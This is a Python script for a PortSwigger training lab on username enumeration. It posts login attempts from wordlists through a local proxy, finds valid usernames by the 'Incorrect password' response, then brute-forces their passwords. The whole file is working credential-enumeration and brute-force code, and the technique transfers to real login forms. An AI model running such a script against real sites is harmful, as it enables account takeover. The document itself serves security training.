 #!/bin/python3

                                                        #This script is used for portswigger username enumeration lab
# LAB LINK : https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-response                                         
# Download and save usernames.txt and passwords.txt file from portswigger lab

# USAGE : python3 script.py https://lablink/login lab_subdomain


import requests
import sys
import json
import re

url = sys.argv[1]
cookies=dict(session='05aa8QKhneYo8ye2m2jQFeVEEnyofYgr')
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
headers = {
"Host": sys.argv[2],
"Connection": "keep-alive",
"Cache-Control": "max-age=0",
"Upgrade-Insecure-Requests": "1",
"Content-Type": "application/x-www-form-urlencoded",
"User-Agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Referer": "https://acfe1fc41f8d430ec0ac198a00040016.web-security-academy.net/login",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9",
}



def find_pass(naming,passwd):
        data = "username={}&password={}".format(naming,passwd)
        response = requests.post(url, headers=headers,cookies=cookies, data=data, proxies=proxies, verify=False)
#       print("Status Code", response.status_code)
        resp = response.text
#       print(resp)
        if  'Incorrect password' not in resp:
                print("USERNAME = ", naming)
                print("PASSWORD = ", passwd)
                exit()

def play_login(username):
        data = "username={}&password=random".format(naming)
        response = requests.post(url, headers=headers,cookies=cookies, data=data, proxies=proxies, verify=False)
        resp = response.text
        if response.status_code != 200:
                print("Error Occured With This Status Code = ", response.status_code)
                exit()
        if 'Incorrect password' in resp:
                print("Found Correct Username", naming)
                for passwd in pass_list:
                        find_pass(naming,passwd)

#### Doing Request

passwd="random"
names_list = []
pass_list = []
with open("usernames.txt") as u1, open("password.txt") as p1:
    for name in u1:
        name = name.strip()
        names_list.append(name)
    for passw in p1:
        passw = passw.strip()
        pass_list.append(passw)
for naming in names_list:
        respon = play_login(naming)
